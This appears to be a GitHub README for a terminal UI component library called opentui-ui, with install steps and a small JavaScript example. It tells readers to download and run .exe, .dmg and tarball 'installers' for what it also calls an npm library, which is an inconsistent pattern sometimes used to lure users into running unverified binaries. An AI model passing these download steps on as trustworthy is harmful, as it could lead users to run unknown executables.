---
layout: "default"
title: "🎨 opentui-ui - A Simple UI Library for Terminals"
description: "🖥️ Build and enhance terminal applications with a versatile UI component library designed for ease and efficiency, powered by @opentui/core."
---
# 🎨 opentui-ui - A Simple UI Library for Terminals

## 📥 Download Now
[![Download opentui-ui](https://img.shields.io/badge/Download-opentui--ui-brightgreen.svg)](https://github.com/RohitDabi/opentui-ui/releases)

## 🚀 Getting Started
Welcome! This guide will help you download and run the `opentui-ui`, a user-friendly UI component library for terminal applications. Whether you're looking to enhance your terminal's look or create a new project, you're in the right place.

## 💻 System Requirements
To run `opentui-ui`, you'll need:

- A modern operating system (Windows, macOS, or Linux)
- At least 512 MB of RAM
- A terminal or command prompt capable of executing Node.js applications

## 🌐 Features
`opentui-ui` offers a variety of components to make your terminal applications visually appealing and easier to navigate:

- **Buttons and Menus**: Create interactive buttons and menus for user choices.
- **Forms and Inputs**: Collect user information easily.
- **Layouts**: Organize your components neatly on the screen.
- **Themes**: Customize the appearance with various themes.

## 📦 Download & Install
To get `opentui-ui`, visit the [Releases page](https://github.com/RohitDabi/opentui-ui/releases). This is where you'll find the latest version ready for download.

### Steps to Download
1. Click on the [Releases page](https://github.com/RohitDabi/opentui-ui/releases).
2. Look for the latest version at the top of the page.
3. Choose the file that best fits your operating system:
   - For Windows, select `opentui-ui-win.exe`.
   - For macOS, select `opentui-ui-mac.dmg`.
   - For Linux, select `opentui-ui-linux.tar.gz`.

4. Click on the file to download it.

### Installing the Application
After downloading, the installation process will differ slightly depending on your OS:

#### Windows
1. Locate the downloaded `opentui-ui-win.exe` file in your Downloads folder.
2. Double-click the file to run it.
3. Follow the on-screen instructions to complete the installation.

#### macOS
1. Open the `.dmg` file you downloaded.
2. Drag the `opentui-ui` icon into your Applications folder.
3. You can now find `opentui-ui` in your Applications list.

#### Linux
1. Extract the downloaded `opentui-ui-linux.tar.gz` file.
2. Open your terminal.
3. Navigate to the folder where you extracted the files.
4. Run the application using the command `./opentui-ui`.

## 📖 Using opentui-ui
Once you have installed `opentui-ui`, you can start building your terminal applications. Here are the steps to create your first project:

1. **Open your terminal**.
2. **Create a new directory** for your project:
   ```bash
   mkdir my-first-project
   cd my-first-project
   ```

3. **Initialize a new Node.js project**:
   ```bash
   npm init -y
   ```

4. **Install opentui-ui** using npm:
   ```bash
   npm install opentui-ui
   ```

5. **Create a new file** named `app.js`:
   ```bash
   touch app.js
   ```

6. **Open `app.js` in your favorite text editor** and add the following code to start using the library:
   ```javascript
   const { Button, Menu } = require('opentui-ui');

   const myButton = new Button('Click Me!');
   myButton.onClick(() => {
       console.log('Button was clicked!');
   });

   const myMenu = new Menu(['Option 1', 'Option 2']);
   myMenu.onSelect((option) => {
       console.log(`You selected: ${option}`);
   });
   ```

7. **Run your app**:
   ```bash
   node app.js
   ```

You have now successfully created and run a simple application with `opentui-ui`!

## 🛠️ Troubleshooting
If you encounter any issues during installation or usage, here are some common problems and solutions:

- **Application won’t start**: Ensure you have installed all dependencies by running `npm install`.
- **Download issues**: Double-check your internet connection and try downloading the file again.
- **Permission errors**: On macOS or Linux, you may need to grant execute permissions using:
   ```bash
   chmod +x opentui-ui
   ```

## 🌟 Community and Support
If you have questions or need help, feel free to reach out:

- **Issues Page**: Report any problems on the Issues section of this repository.
- **Discussion Forum**: Engage with other users in discussions about `opentui-ui`.

We hope you enjoy using `opentui-ui`! For further information, visit our [Documentation](https://github.com/RohitDabi/opentui-ui/wiki) for more advanced features and usage examples.